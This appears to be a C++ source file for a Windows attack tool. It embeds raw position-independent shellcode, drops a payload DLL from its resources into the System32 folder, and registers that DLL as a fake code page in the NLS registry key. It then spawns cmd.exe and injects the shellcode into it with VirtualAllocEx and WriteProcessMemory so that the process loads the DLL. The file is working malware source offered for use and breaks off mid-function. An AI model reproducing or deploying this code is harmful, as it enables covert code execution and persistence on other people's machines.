#include "headers.hpp"
#include "payload.hpp"
#include "strsafe.h"
#include "payload.hpp"
#include "resource1.h"
#define MAX_SIZE_DATA 260

//Shellcode to inject, it must be PIC
//Use hasherezade tutorial for that.
constexpr BYTE StubInject[] = { 0x56,0x48,0x8b,0xf4,0x48,0x83,0xe4,0xf0,0x48,0x83,0xec,0x20,0xe8,0x05,0x00,0x00,0x00,0x48,0x8b,0xe6,0x5e,0xc3,0x48,0x89,0x4c,0x24,0x08,0x48,0x83,0xec,0x58,0x48,0x8d,0x4c,0x24,0x20,0xe8,0x87,0x00,0x00,0x00,0x85,0xc0,0x74,0x07,0xb8,0x01,0x00,0x00,0x00,0xeb,0x11,0x48,0x8d,0x54,0x24,0x20,0x48,0x8b,0x4c,0x24,0x60,0xe8,0x07,0x00,0x00,0x00,0x33,0xc0,0x48,0x83,0xc4,0x58,0xc3,0x48,0x89,0x54,0x24,0x10,0x48,0x89,0x4c,0x24,0x08,0x48,0x83,0xec,0x38,0x48,0x8b,0x44,0x24,0x40,0x8b,0x00,0x89,0x44,0x24,0x40,0x48,0x8b,0x44,0x24,0x48,0xff,0x50,0x08,0x48,0x85,0xc0,0x75,0x0e,0x48,0x8b,0x44,0x24,0x48,0xff,0x50,0x18,0x85,0xc0,0x75,0x02,0xeb,0x2d,0x8b,0x4c,0x24,0x40,0x48,0x8b,0x44,0x24,0x48,0xff,0x10,0x85,0xc0,0x75,0x02,0xeb,0x1c,0x8b,0x4c,0x24,0x40,0x48,0x8b,0x44,0x24,0x48,0xff,0x50,0x10,0x85,0xc0,0x75,0x02,0xeb,0x0a,0x33,0xc9,0x48,0x8b,0x44,0x24,0x48,0xff,0x50,0x20,0x48,0x83,0xc4,0x38,0xc3,0x48,0x89,0x4c,0x24,0x08,0x48,0x81,0xec,0xd8,0x00,0x00,0x00,0xb8,0x6b,0x00,0x00,0x00,0x66,0x89,0x84,0x24,0xa0,0x00,0x00,0x00,0xb8,0x65,0x00,0x00,0x00,0x66,0x89,0x84,0x24,0xa2,0x00,0x00,0x00,0xb8,0x72,0x00,0x00,0x00,0x66,0x89,0x84,0x24,0xa4,0x00,0x00,0x00,0xb8,0x6e,0x00,0x00,0x00,0x66,0x89,0x84,0x24,0xa6,0x00,0x00,0x00,0xb8,0x65,0x00,0x00,0x00,0x66,0x89,0x84,0x24,0xa8,0x00,0x00,0x00,0xb8,0x6c,0x00,0x00,0x00,0x66,0x89,0x84,0x24,0xaa,0x00,0x00,0x00,0xb8,0x33,0x00,0x00,0x00,0x66,0x89,0x84,0x24,0xac,0x00,0x00,0x00,0xb8,0x32,0x00,0x00,0x00,0x66,0x89,0x84,0x24,0xae,0x00,0x00,0x00,0xb8,0x2e,0x00,0x00,0x00,0x66,0x89,0x84,0x24,0xb0,0x00,0x00,0x00,0xb8,0x64,0x00,0x00,0x00,0x66,0x89,0x84,0x24,0xb2,0x00,0x00,0x00,0xb8,0x6c,0x00,0x00,0x00,0x66,0x89,0x84,0x24,0xb4,0x00,0x00,0x00,0xb8,0x6c,0x00,0x00,0x00,0x66,0x89,0x84,0x24,0xb6,0x00,0x00,0x00,0x33,0xc0,0x66,0x89,0x84,0x24,0xb8,0x00,0x00,0x00,0x48,0x8d,0x8c,0x24,0xa0,0x00,0x00,0x00,0xe8,0xe4,0x05,0x00,0x00,0x48,0x89,0x84,0x24,0x98,0x00,0x00,0x00,0x48,0x83,0xbc,0x24,0x98,0x00,0x00,0x00,0x00,0x75,0x0a,0xb8,0x01,0x00,0x00,0x00,0xe9,0x8f,0x03,0x00,0x00,0xc6,0x44,0x24,0x40,0x47,0xc6,0x44,0x24,0x41,0x65,0xc6,0x44,0x24,0x42,0x74,0xc6,0x44,0x24,0x43,0x50,0xc6,0x44,0x24,0x44,0x72,0xc6,0x44,0x24,0x45,0x6f,0xc6,0x44,0x24,0x46,0x63,0xc6,0x44,0x24,0x47,0x41,0xc6,0x44,0x24,0x48,0x64,0xc6,0x44,0x24,0x49,0x64,0xc6,0x44,0x24,0x4a,0x72,0xc6,0x44,0x24,0x4b,0x65,0xc6,0x44,0x24,0x4c,0x73,0xc6,0x44,0x24,0x4d,0x73,0xc6,0x44,0x24,0x4e,0x00,0x48,0x8d,0x54,0x24,0x40,0x48,0x8b,0x8c,0x24,0x98,0x00,0x00,0x00,0xe8,0x3a,0x03,0x00,0x00,0x48,0x89,0x84,0x24,0xc0,0x00,0x00,0x00,0x48,0x83,0xbc,0x24,0xc0,0x00,0x00,0x00,0x00,0x75,0x0a,0xb8,0x03,0x00,0x00,0x00,0xe9,0x15,0x03,0x00,0x00,0x48,0x8b,0x84,0x24,0xe0,0x00,0x00,0x00,0x48,0x8b,0x8c,0x24,0xc0,0x00,0x00,0x00,0x48,0x89,0x48,0x28,0xc6,0x44,0x24,0x50,0x47,0xc6,0x44,0x24,0x51,0x65,0xc6,0x44,0x24,0x52,0x74,0xc6,0x44,0x24,0x53,0x43,0xc6,0x44,0x24,0x54,0x6f,0xc6,0x44,0x24,0x55,0x6e,0xc6,0x44,0x24,0x56,0x73,0xc6,0x44,0x24,0x57,0x6f,0xc6,0x44,0x24,0x58,0x6c,0xc6,0x44,0x24,0x59,0x65,0xc6,0x44,0x24,0x5a,0x57,0xc6,0x44,0x24,0x5b,0x69,0xc6,0x44,0x24,0x5c,0x6e,0xc6,0x44,0x24,0x5d,0x64,0xc6,0x44,0x24,0x5e,0x6f,0xc6,0x44,0x24,0x5f,0x77,0xc6,0x44,0x24,0x60,0x00,0xc6,0x44,0x24,0x30,0x41,0xc6,0x44,0x24,0x31,0x6c,0xc6,0x44,0x24,0x32,0x6c,0xc6,0x44,0x24,0x33,0x6f,0xc6,0x44,0x24,0x34,0x63,0xc6,0x44,0x24,0x35,0x43,0xc6,0x44,0x24,0x36,0x6f,0xc6,0x44,0x24,0x37,0x6e,0xc6,0x44,0x24,0x38,0x73,0xc6,0x44,0x24,0x39,0x6f,0xc6,0x44,0x24,0x3a,0x6c,0xc6,0x44,0x24,0x3b,0x65,0xc6,0x44,0x24,0x3c,0x00,0xc6,0x44,0x24,0x20,0x53,0xc6,0x44,0x24,0x21,0x65,0xc6,0x44,0x24,0x22,0x74,0xc6,0x44,0x24,0x23,0x43,0xc6,0x44,0x24,0x24,0x6f,0xc6,0x44,0x24,0x25,0x6e,0xc6,0x44,0x24,0x26,0x73,0xc6,0x44,0x24,0x27,0x6f,0xc6,0x44,0x24,0x28,0x6c,0xc6,0x44,0x24,0x29,0x65,0xc6,0x44,0x24,0x2a,0x43,0xc6,0x44,0x24,0x2b,0x50,0xc6,0x44,0x24,0x2c,0x00,0xc6,0x44,0x24,0x68,0x53,0xc6,0x44,0x24,0x69,0x65,0xc6,0x44,0x24,0x6a,0x74,0xc6,0x44,0x24,0x6b,0x43,0xc6,0x44,0x24,0x6c,0x6f,0xc6,0x44,0x24,0x6d,0x6e,0xc6,0x44,0x24,0x6e,0x73,0xc6,0x44,0x24,0x6f,0x6f,0xc6,0x44,0x24,0x70,0x6c,0xc6,0x44,0x24,0x71,0x65,0xc6,0x44,0x24,0x72,0x4f,0xc6,0x44,0x24,0x73,0x75,0xc6,0x44,0x24,0x74,0x74,0xc6,0x44,0x24,0x75,0x70,0xc6,0x44,0x24,0x76,0x75,0xc6,0x44,0x24,0x77,0x74,0xc6,0x44,0x24,0x78,0x43,0xc6,0x44,0x24,0x79,0x50,0xc6,0x44,0x24,0x7a,0x00,0xc6,0x84,0x24,0x80,0x00,0x00,0x00,0x53,0xc6,0x84,0x24,0x81,0x00,0x00,0x00,0x65,0xc6,0x84,0x24,0x82,0x00,0x00,0x00,0x74,0xc6,0x84,0x24,0x83,0x00,0x00,0x00,0x54,0xc6,0x84,0x24,0x84,0x00,0x00,0x00,0x68,0xc6,0x84,0x24,0x85,0x00,0x00,0x00,0x72,0xc6,0x84,0x24,0x86,0x00,0x00,0x00,0x65,0xc6,0x84,0x24,0x87,0x00,0x00,0x00,0x61,0xc6,0x84,0x24,0x88,0x00,0x00,0x00,0x64,0xc6,0x84,0x24,0x89,0x00,0x00,0x00,0x55,0xc6,0x84,0x24,0x8a,0x00,0x00,0x00,0x49,0xc6,0x84,0x24,0x8b,0x00,0x00,0x00,0x4c,0xc6,0x84,0x24,0x8c,0x00,0x00,0x00,0x61,0xc6,0x84,0x24,0x8d,0x00,0x00,0x00,0x6e,0xc6,0x84,0x24,0x8e,0x00,0x00,0x00,0x67,0xc6,0x84,0x24,0x8f,0x00,0x00,0x00,0x75,0xc6,0x84,0x24,0x90,0x00,0x00,0x00,0x61,0xc6,0x84,0x24,0x91,0x00,0x00,0x00,0x67,0xc6,0x84,0x24,0x92,0x00,0x00,0x00,0x65,0xc6,0x84,0x24,0x93,0x00,0x00,0x00,0x00,0x48,0x8d,0x54,0x24,0x68,0x48,0x8b,0x8c,0x24,0x98,0x00,0x00,0x00,0x48,0x8b,0x84,0x24,0xe0,0x00,0x00,0x00,0xff,0x50,0x28,0x48,0x8b,0x8c,0x24,0xe0,0x00,0x00,0x00,0x48,0x89,0x01,0x48,0x8b,0x84,0x24,0xe0,0x00,0x00,0x00,0x48,0x83,0x38,0x00,0x75,0x0a,0xb8,0x04,0x00,0x00,0x00,0xe9,0xf0,0x00,0x00,0x00,0x48,0x8d,0x54,0x24,0x50,0x48,0x8b,0x8c,0x24,0x98,0x00,0x00,0x00,0x48,0x8b,0x84,0x24,0xe0,0x00,0x00,0x00,0xff,0x50,0x28,0x48,0x8b,0x8c,0x24,0xe0,0x00,0x00,0x00,0x48,0x89,0x41,0x08,0x48,0x8b,0x84,0x24,0xe0,0x00,0x00,0x00,0x48,0x83,0x78,0x08,0x00,0x75,0x0a,0xb8,0x05,0x00,0x00,0x00,0xe9,0xb3,0x00,0x00,0x00,0x48,0x8d,0x54,0x24,0x20,0x48,0x8b,0x8c,0x24,0x98,0x00,0x00,0x00,0x48,0x8b,0x84,0x24,0xe0,0x00,0x00,0x00,0xff,0x50,0x28,0x48,0x8b,0x8c,0x24,0xe0,0x00,0x00,0x00,0x48,0x89,0x41,0x10,0x48,0x8b,0x84,0x24,0xe0,0x00,0x00,0x00,0x48,0x83,0x78,0x10,0x00,0x75,0x07,0xb8,0x06,0x00,0x00,0x00,0xeb,0x79,0x48,0x8d,0x54,0x24,0x30,0x48,0x8b,0x8c,0x24,0x98,0x00,0x00,0x00,0x48,0x8b,0x84,0x24,0xe0,0x00,0x00,0x00,0xff,0x50,0x28,0x48,0x8b,0x8c,0x24,0xe0,0x00,0x00,0x00,0x48,0x89,0x41,0x18,0x48,0x8b,0x84,0x24,0xe0,0x00,0x00,0x00,0x48,0x83,0x78,0x18,0x00,0x75,0x07,0xb8,0x07,0x00,0x00,0x00,0xeb,0x3f,0x48,0x8d,0x94,0x24,0x80,0x00,0x00,0x00,0x48,0x8b,0x8c,0x24,0x98,0x00,0x00,0x00,0x48,0x8b,0x84,0x24,0xe0,0x00,0x00,0x00,0xff,0x50,0x28,0x48,0x8b,0x8c,0x24,0xe0,0x00,0x00,0x00,0x48,0x89,0x41,0x20,0x48,0x8b,0x84,0x24,0xe0,0x00,0x00,0x00,0x48,0x83,0x78,0x20,0x00,0x75,0x07,0xb8,0x08,0x00,0x00,0x00,0xeb,0x02,0x33,0xc0,0x48,0x81,0xc4,0xd8,0x00,0x00,0x00,0xc3,0x48,0x89,0x54,0x24,0x10,0x48,0x89,0x4c,0x24,0x08,0x48,0x83,0xec,0x78,0x48,0x8b,0x84,0x24,0x80,0x00,0x00,0x00,0x48,0x89,0x44,0x24,0x30,0x48,0x8b,0x44,0x24,0x30,0x0f,0xb7,0x00,0x3d,0x4d,0x5a,0x00,0x00,0x74,0x07,0x33,0xc0,0xe9,0xfa,0x01,0x00,0x00,0x48,0x8b,0x44,0x24,0x30,0x48,0x63,0x40,0x3c,0x48,0x8b,0x8c,0x24,0x80,0x00,0x00,0x00,0x48,0x03,0xc8,0x48,0x8b,0xc1,0x48,0x89,0x44,0x24,0x40,0xb8,0x08,0x00,0x00,0x00,0x48,0x6b,0xc0,0x00,0x48,0x8b,0x4c,0x24,0x40,0x48,0x8d,0x84,0x01,0x88,0x00,0x00,0x00,0x48,0x89,0x44,0x24,0x38,0x48,0x8b,0x44,0x24,0x38,0x83,0x38,0x00,0x75,0x07,0x33,0xc0,0xe9,0xb2,0x01,0x00,0x00,0x48,0x8b,0x44,0x24,0x38,0x8b,0x00,0x89,0x44,0x24,0x18,0x8b,0x44,0x24,0x18,0x48,0x03,0x84,0x24,0x80,0x00,0x00,0x00,0x48,0x89,0x44,0x24,0x10,0x48,0x8b,0x44,0x24,0x10,0x8b,0x40,0x18,0x48,0x89,0x44,0x24,0x48,0x48,0x8b,0x44,0x24,0x10,0x8b,0x40,0x1c,0x89,0x44,0x24,0x24,0x48,0x8b,0x44,0x24,0x10,0x8b,0x40,0x20,0x89,0x44,0x24,0x1c,0x48,0x8b,0x44,0x24,0x10,0x8b,0x40,0x24,0x89,0x44,0x24,0x20,0x48,0xc7,0x44,0x24,0x08,0x00,0x00,0x00,0x00,0xeb,0x0d,0x48,0x8b,0x44,0x24,0x08,0x48,0xff,0xc0,0x48,0x89,0x44,0x24,0x08,0x48,0x8b,0x44,0x24,0x48,0x48,0x39,0x44,0x24,0x08,0x0f,0x83,0x3b,0x01,0x00,0x00,0x8b,0x44,0x24,0x1c,0x48,0x8b,0x8c,0x24,0x80,0x00,0x00,0x00,0x48,0x03,0xc8,0x48,0x8b,0xc1,0x48,0x8b,0x4c,0x24,0x08,0x48,0x8d,0x04,0x88,0x48,0x89,0x44,0x24,0x58,0x8b,0x44,0x24,0x20,0x48,0x8b,0x8c,0x24,0x80,0x00,0x00,0x00,0x48,0x03,0xc8,0x48,0x8b,0xc1,0x48,0x8b,0x4c,0x24,0x08,0x48,0x8d,0x04,0x48,0x48,0x89,0x44,0x24,0x50,0x8b,0x44,0x24,0x24,0x48,0x8b,0x8c,0x24,0x80,0x00,0x00,0x00,0x48,0x03,0xc8,0x48,0x8b,0xc1,0x48,0x8b,0x4c,0x24,0x50,0x0f,0xb7,0x09,0x48,0x8d,0x04,0x88,0x48,0x89,0x44,0x24,0x60,0x48,0x8b,0x44,0x24,0x58,0x8b,0x00,0x48,0x8b,0x8c,0x24,0x80,0x00,0x00,0x00,0x48,0x03,0xc8,0x48,0x8b,0xc1,0x48,0x89,0x44,0x24,0x28,0x48,0xc7,0x04,0x24,0x00,0x00,0x00,0x00,0xeb,0x0b,0x48,0x8b,0x04,0x24,0x48,0xff,0xc0,0x48,0x89,0x04,0x24,0x48,0x8b,0x04,0x24,0x48,0x8b,0x8c,0x24,0x88,0x00,0x00,0x00,0x48,0x03,0xc8,0x48,0x8b,0xc1,0x0f,0xbe,0x00,0x85,0xc0,0x74,0x45,0x48,0x8b,0x04,0x24,0x48,0x8b,0x4c,0x24,0x28,0x48,0x03,0xc8,0x48,0x8b,0xc1,0x0f,0xbe,0x00,0x85,0xc0,0x74,0x2f,0x48,0x8b,0x04,0x24,0x48,0x8b,0x8c,0x24,0x88,0x00,0x00,0x00,0x48,0x03,0xc8,0x48,0x8b,0xc1,0x0f,0xbe,0x00,0x48,0x8b,0x0c,0x24,0x48,0x8b,0x54,0x24,0x28,0x48,0x03,0xd1,0x48,0x8b,0xca,0x0f,0xbe,0x09,0x3b,0xc1,0x74,0x02,0xeb,0x02,0xeb,0x97,0x48,0x8b,0x04,0x24,0x48,0x8b,0x8c,0x24,0x88,0x00,0x00,0x00,0x48,0x03,0xc8,0x48,0x8b,0xc1,0x0f,0xbe,0x00,0x85,0xc0,0x75,0x2d,0x48,0x8b,0x04,0x24,0x48,0x8b,0x4c,0x24,0x28,0x48,0x03,0xc8,0x48,0x8b,0xc1,0x0f,0xbe,0x00,0x85,0xc0,0x75,0x17,0x48,0x8b,0x44,0x24,0x60,0x8b,0x00,0x48,0x8b,0x8c,0x24,0x80,0x00,0x00,0x00,0x48,0x03,0xc8,0x48,0x8b,0xc1,0xeb,0x07,0xe9,0xa8,0xfe,0xff,0xff,0x33,0xc0,0x48,0x83,0xc4,0x78,0xc3,0x48,0x89,0x4c,0x24,0x08,0x48,0x83,0xec,0x58,0x65,0x48,0x8b,0x04,0x25,0x60,0x00,0x00,0x00,0x48,0x89,0x44,0x24,0x40,0x48,0x8b,0x44,0x24,0x40,0x48,0x8b,0x40,0x18,0x48,0x89,0x44,0x24,0x48,0x48,0x8b,0x44,0x24,0x48,0x48,0x83,0xc0,0x20,0x48,0x89,0x44,0x24,0x38,0x48,0x8b,0x44,0x24,0x38,0x48,0x8b,0x00,0x48,0x89,0x44,0x24,0x30,0xeb,0x0d,0x48,0x8b,0x44,0x24,0x30,0x48,0x8b,0x00,0x48,0x89,0x44,0x24,0x30,0x48,0x8b,0x44,0x24,0x38,0x48,0x39,0x44,0x24,0x30,0x0f,0x84,0xbf,0x01,0x00,0x00,0x48,0x8b,0x44,0x24,0x30,0x48,0x83,0xe8,0x10,0x48,0x89,0x44,0x24,0x28,0x48,0x83,0x7c,0x24,0x28,0x00,0x74,0x0c,0x48,0x8b,0x44,0x24,0x28,0x48,0x83,0x78,0x30,0x00,0x75,0x05,0xe9,0x98,0x01,0x00,0x00,0x48,0x8b,0x44,0x24,0x28,0x48,0x8b,0x40,0x60,0x48,0x89,0x44,0x24,0x10,0x48,0x83,0x7c,0x24,0x10,0x00,0x75,0x02,0xeb,0xa4,0x48,0xc7,0x04,0x24,0x00,0x00,0x00,0x00,0xeb,0x0b,0x48,0x8b,0x04,0x24,0x48,0xff,0xc0,0x48,0x89,0x04,0x24,0x48,0x8b,0x44,0x24,0x28,0x0f,0xb7,0x40,0x58,0x48,0x39,0x04,0x24,0x0f,0x83,0x26,0x01,0x00,0x00,0x48,0x8b,0x44,0x24,0x60,0x48,0x8b,0x0c,0x24,0x0f,0xb7,0x04,0x48,0x85,0xc0,0x74,0x11,0x48,0x8b,0x44,0x24,0x10,0x48,0x8b,0x0c,0x24,0x0f,0xb7,0x04,0x48,0x85,0xc0,0x75,0x05,0xe9,0xff,0x00,0x00,0x00,0x48,0x8b,0x44,0x24,0x60,0x48,0x8b,0x0c,0x24,0x0f,0xb7,0x04,0x48,0x83,0xf8,0x5a,0x7f,0x47,0x48,0x8b,0x44,0x24,0x60,0x48,0x8b,0x0c,0x24,0x0f,0xb7,0x04,0x48,0x83,0xf8,0x41,0x7c,0x35,0x48,0x8b,0x44,0x24,0x60,0x48,0x8b,0x0c,0x24,0x0f,0xb7,0x04,0x48,0x83,0xe8,0x41,0x83,0xc0,0x61,0x89,0x44,0x24,0x20,0x48,0x8b,0x44,0x24,0x60,0x48,0x8b,0x0c,0x24,0x0f,0xb7,0x54,0x24,0x20,0x66,0x89,0x14,0x48,0x0f,0xb7,0x44,0x24,0x20,0x66,0x89,0x44,0x24,0x08,0xeb,0x12,0x48,0x8b,0x44,0x24,0x60,0x48,0x8b,0x0c,0x24,0x0f,0xb7,0x04,0x48,0x66,0x89,0x44,0x24,0x08,0x0f,0xb7,0x44,0x24,0x08,0x66,0x89,0x44,0x24,0x18,0x48,0x8b,0x44,0x24,0x10,0x48,0x8b,0x0c,0x24,0x0f,0xb7,0x04,0x48,0x83,0xf8,0x5a,0x7f,0x47,0x48,0x8b,0x44,0x24,0x10,0x48,0x8b,0x0c,0x24,0x0f,0xb7,0x04,0x48,0x83,0xf8,0x41,0x7c,0x35,0x48,0x8b,0x44,0x24,0x10,0x48,0x8b,0x0c,0x24,0x0f,0xb7,0x04,0x48,0x83,0xe8,0x41,0x83,0xc0,0x61,0x89,0x44,0x24,0x24,0x48,0x8b,0x44,0x24,0x10,0x48,0x8b,0x0c,0x24,0x0f,0xb7,0x54,0x24,0x24,0x66,0x89,0x14,0x48,0x0f,0xb7,0x44,0x24,0x24,0x66,0x89,0x44,0x24,0x0a,0xeb,0x12,0x48,0x8b,0x44,0x24,0x10,0x48,0x8b,0x0c,0x24,0x0f,0xb7,0x04,0x48,0x66,0x89,0x44,0x24,0x0a,0x0f,0xb7,0x44,0x24,0x0a,0x66,0x89,0x44,0x24,0x1c,0x0f,0xb7,0x44,0x24,0x18,0x0f,0xb7,0x4c,0x24,0x1c,0x3b,0xc1,0x74,0x02,0xeb,0x05,0xe9,0xbc,0xfe,0xff,0xff,0x48,0x8b,0x44,0x24,0x60,0x48,0x8b,0x0c,0x24,0x0f,0xb7,0x04,0x48,0x85,0xc0,0x75,0x1c,0x48,0x8b,0x44,0x24,0x10,0x48,0x8b,0x0c,0x24,0x0f,0xb7,0x04,0x48,0x85,0xc0,0x75,0x0b,0x48,0x8b,0x44,0x24,0x28,0x48,0x8b,0x40,0x30,0xeb,0x07,0xe9,0x24,0xfe,0xff,0xff,0x33,0xc0,0x48,0x83,0xc4,0x58,0xc3,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00 };

constexpr size_t lengthInject = std::size(StubInject);

UINT StringToInt(PWCHAR str) noexcept
{
	wchar_t chrSubkey, chr, * j;
	UINT i;

	j = str;
	chrSubkey = *str;
	for (i = 0; *j; chrSubkey = *j)
	{
		++j;
		if ((chrSubkey - 0x41) > 5u)
		{
			if ((chrSubkey - 0x30) > 9u)
			{
				if ((chrSubkey - 0x61) > 5u)
					return i;
				chr = chrSubkey - 87;
			}
			else
			{
				chr = chrSubkey - 0x30;
			}
		}
		else
		{
			chr = chrSubkey - 55;
		}
		i = chr + 16 * i;
	}
	return i;
}

bool FindCodePageWithPayload(PRegistryKey regObject, UINT dwValuesCount, UINT dwMaxLenValues){
	DWORD dwCountName = 0, typeData, ValueDataSize = 260;
	uint32_t CodePageInt;
	WCHAR CodePageID[MAX_PATH], ValueData[MAX_SIZE_DATA];
	bool bResult = false;

	for (UINT i = 0; i < dwValuesCount; i++) {
		dwCountName = 260;
		if (RegEnumValueW(regObject->hSubkeyNls, i, CodePageID, &dwCountName, nullptr, &typeData, (BYTE*)&ValueData,
			&ValueDataSize) != EXIT_SUCCESS)
		{
			std::wprintf(L"Could not query Code Page ID %s, Last error: [%x]\n", CodePageID, GetLastError());
			continue;
		}
		if (typeData == REG_SZ && !wcscmp(ValueData, regObject->getStringBuffer(Index::DLL_NAME))) {
#ifdef _DEBUG
			std::wprintf(L"Payload value has been found!: %d - %s = %s\n", i, CodePageID, ValueData);
#endif
			bResult = true;
		}
	}
	return bResult;
}

//Main Bugs:
// 1. Fix RegEnumValue in one of the modules and creation of payload.dll. (MISSING)
// Also verify that our look up functions work as intended:
//https://stackoverflow.com/questions/17858131/c-regenumvalue-throws-error-more-data
// 2.Make Shellcode Injector class and verify why is not working.

bool IterateCodePageAndExtractProperId(PRegistryKey regObject) {
	DWORD dwMaxLenValues, dwCountName = 0, dwValuesCount, typeData, ValueDataSize = 260;
	WCHAR CodePageID[MAX_PATH], ValueData[MAX_SIZE_DATA];
	uint32_t CodePageInt = NULL;
	bool correctRet = false;

	if (::RegQueryInfoKeyW(regObject->hSubkeyNls, nullptr, nullptr, nullptr,
		nullptr, nullptr, nullptr, &dwValuesCount, &dwMaxLenValues, nullptr, nullptr, nullptr))
	{
		std::cerr << "Could not query information for the key, last error is: " << GetLastError() << "\n";
		return correctRet;
	}
	//Create function that iterates over all values, then checks for payload name, 
	//if found delete it.
	if (FindCodePageWithPayload(regObject, dwValuesCount, dwMaxLenValues)){
		correctRet = true;
		return correctRet;
	}
	for (UINT i = 0; i < dwValuesCount; i++) {
		dwCountName = 260;
		LSTATUS status = RegEnumValueW(regObject->hSubkeyNls, i, CodePageID, &dwCountName, nullptr, &typeData, (BYTE*)&ValueData,
			&ValueDataSize);
		if (status != EXIT_SUCCESS)
		{
			std::wprintf(L"Could not query Code Page ID %s, Last error: [%x]\n", CodePageID, status);
			continue;
		}
		if (typeData == REG_SZ && wcsstr(ValueData, L".dll")){
#ifdef _DEBUG
			std::wprintf(L"Value with dll found in i = %d, %s = %s\n", i, CodePageID, ValueData);
			CodePageInt = StringToInt(CodePageID);
			std::wprintf(L"Code page as int is: %x\n", CodePageInt);
#endif // _DEBUG
			CodePageInt = StringToInt(CodePageID);
			break;
		}
	}
	if (CodePageInt == NULL) {
		std::printf("Could not find apropiate dll extension inside one of the subvalues\n");
		return correctRet;
	}
	CodePageInt += 1;
	while (1){
		if (SUCCEEDED(StringCchPrintfW(ValueData, MAX_SIZE_DATA, L"%04x", CodePageInt)))
		{
			std::printf("Trying to create in CodePage ID %x\n", CodePageInt);
		}
		if (!RegSetValueExW(regObject->hSubkeyNls, ValueData, NULL, REG_SZ, (BYTE*)regObject->getStringBuffer(Index::DLL_NAME),
			regObject->getStringSize(Index::FULL_PAYLOAD_DLL_PATH)))
		{
			std::printf("Sucessfully created dll payload in CodePage ID %x\n", CodePageInt);
			correctRet = true;
			regObject->setCodePageID(CodePageInt);
			break;
		}
		CodePageInt += 1;
	}
	return correctRet;
}

bool CreateProcessToInject(LPPROCESS_INFORMATION procInfo) {
	STARTUPINFOW infoProc;
	//PROCESS_INFORMATION processInfo;
	ZeroMemory(&infoProc, sizeof(infoProc));
	infoProc.cb = sizeof(infoProc);
	ZeroMemory(procInfo, sizeof(procInfo));
	wchar_t path[MAX_PATH];
	GetSystemDirectoryW(path, MAX_PATH);
	wcscat_s(path, MAX_PATH, L"\\cmd.exe");
	return CreateProcessW(NULL, path, NULL, NULL, false, CREATE_NEW_CONSOLE, NULL, NULL, &infoProc, procInfo) != NULL;
}

bool DropSystemDllPayload(PRegistryKey regObject) {
	HMODULE hMod = GetModuleHandleA(NULL);
	HRSRC hResource = FindResource(hMod, MAKEINTRESOURCE(IDR_RT_RCDATA1), L"RT_RCDATA");
	if (hResource == NULL)
	{
		printf("Could not find the payload dll resource, exiting...\n");
		return false;
	}
	DWORD dwSizeResource = SizeofResource(hMod, hResource);
	HGLOBAL hResLoaded = LoadResource(hMod, hResource);
	if (hResLoaded == NULL)
	{
		printf("Could not find the dll, exiting...\n");
		return false;
	}
	auto pBuffer = static_cast<BYTE*> (LockResource(hResLoaded));
	LPWSTR pathPayload = new wchar_t[MAX_PATH];
	GetSystemDirectoryW(pathPayload, MAX_PATH);
	wcscat_s(pathPayload, MAX_PATH, L"\\");
	wcscat_s(pathPayload, MAX_PATH, regObject->getStringBuffer(Index::DLL_NAME));
	regObject->setStringBuffer(pathPayload, Index::FULL_PAYLOAD_DLL_PATH);
	HANDLE hFile = CreateFileW(pathPayload, GENERIC_ALL, FILE_SHARE_DELETE,
		NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
	delete[] pathPayload;
	if (hFile == INVALID_HANDLE_VALUE)
	{
		std::printf("Could not obtain HANDLE to the newly created FILE, last error is %d\n", GetLastError());
		return false;
	}
	DWORD dwNumberBytesWritten;
	if (!WriteFile(hFile, pBuffer, dwSizeResource, &dwNumberBytesWritten, nullptr))
	{
		std::printf("Could not write to file, last error is %d\n", GetLastError());
		CloseHandle(hFile);
		return false;
	}
	CloseHandle(hFile);
	return true;
}

void SpawnPayload(DWORD dwCodePageId)
{
	if (!GetConsoleWindow())
	{
		if (!AllocConsole()) {
			return;
		}
	}
	if (!SetConsoleOutputCP(dwCodePageId)) {
		//It fails in here, which is weird as shit ngl.
		//Reverse SetConsoleCP
		if (!SetConsoleCP(dwCodePageId)) {
			std::printf("Could not set payload: Last error is 0x%x\n", GetLastError());
			return;
		}
	}
	SetThreadUILanguage(0);
}

void InjectStagerToPayload(PRegistryKey regObject){

	//Write argument in remote process space
	LPVOID lpCodePageID = (LPVOID)VirtualAllocEx(regObject->m_procInfo.hProcess, NULL, sizeof(DWORD), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	if (lpCodePageID == nullptr) {
		std::printf("Could not allocate buffer in remote process\n");
		return;
	}
	DWORD codePageID = regObject->getCodePage();
	if (!WriteProcessMemory(regObject->m_procInfo.hProcess, lpCodePageID, &codePageID, sizeof(DWORD), NULL)) {
		std::printf("Could not create write memory with codePageID to inject\n");
		return;
	}
	//Alloc and write shellcode, easiest way is VirtualAllocEx + WPM, but we have to pass arg, so I am not so sure how I am going to do that...
	LPVOID ShellcodeMemory = (LPVOID)VirtualAllocEx(regObject->m_procInfo.hProcess, NULL, lengthInject, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	if (ShellcodeMemory == nullptr) {
		std::printf("Could not allocate buffer in remote process\n");
		return;
	}
	//This will write the payload in the remote process.
	if (!WriteProcessMemory(regObject->m_procInfo.hProcess, ShellcodeMemory, &StubInject, lengthInject, NULL)) {
		std::printf("Could not create write memory with codePageID to inject\n");
		return;
	}
	//Need to change protection to EXECUTE_READ.
	DWORD dwProtection;
	if (!VirtualProtectEx(regObject->m_procInfo.hProcess, ShellcodeMemory, lengthInject, PAGE_EXECUTE_READ, &dwProtection)) {
